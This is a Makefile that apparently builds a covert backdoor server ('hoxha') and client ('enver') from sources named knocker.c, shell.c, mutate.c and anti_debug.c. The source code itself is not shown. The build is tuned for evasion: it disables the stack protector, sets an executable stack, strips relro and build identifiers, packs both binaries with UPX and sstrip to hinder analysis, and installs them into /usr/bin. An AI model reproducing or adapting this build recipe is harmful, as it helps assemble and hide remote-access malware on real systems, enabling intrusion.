CC        := cc
OUT       := hoxha
CLIENT    := enver
UPX	 := ./upx
SSTRIP    := ./sstrip
SRC       := knocker.c shell.c mutate.c anti_debug.c
BINDIR    := /usr/bin
CHMOD     := chmod +x
CLIENTSRC := enver.c anti_debug.c mutate.c

CFLAGS    := -static -s -pipe -march=native -O2 -std=gnu17 -Wall -Wextra -pedantic \
             -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident \
             -ffunction-sections -fdata-sections -falign-functions=1 \
             -falign-loops=1 --no-data-sections -falign-jumps=1 \
             -falign-labels=1 -flto -fipa-icf -z execstack

LDFLAGS   := -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code
LIBS      := -lsctp -lpthread

CLIENT_CFLAGS := -s -pipe -march=native -O2 -std=gnu17 -Wall -Wextra -pedantic \
                 -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident \
                 -ffunction-sections -fdata-sections -falign-functions=1 \
                 -falign-loops=1 --no-data-sections -falign-jumps=1 \
                 -falign-labels=1 -flto -fipa-icf -z execstack

CLIENT_LDFLAGS := -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code
CLIENT_LIBS    := -lsctp

.PHONY: all clean install

all: $(OUT) $(CLIENT)

$(OUT): $(SRC)
	$(CC) $(SRC) -o $@ $(CFLAGS) $(LDFLAGS) $(LIBS)
	$(CHMOD) $(UPX)
	$(CHMOD) $(SSTRIP)
	$(UPX) --best --brute $(OUT)
	$(SSTRIP) -z $(OUT)

$(CLIENT): $(CLIENTSRC)
	$(CC) $(CLIENTSRC) -o $@ $(CLIENT_CFLAGS) $(CLIENT_LDFLAGS) $(CLIENT_LIBS)
	$(UPX) --best --brute $(CLIENT)
	$(SSTRIP) -z $(CLIENT)

install: all
	install -Dm755 $(OUT) $(BINDIR)/$(OUT)
	install -Dm755 $(CLIENT) $(BINDIR)/$(CLIENT)

clean:
	rm -f $(OUT) $(CLIENT)
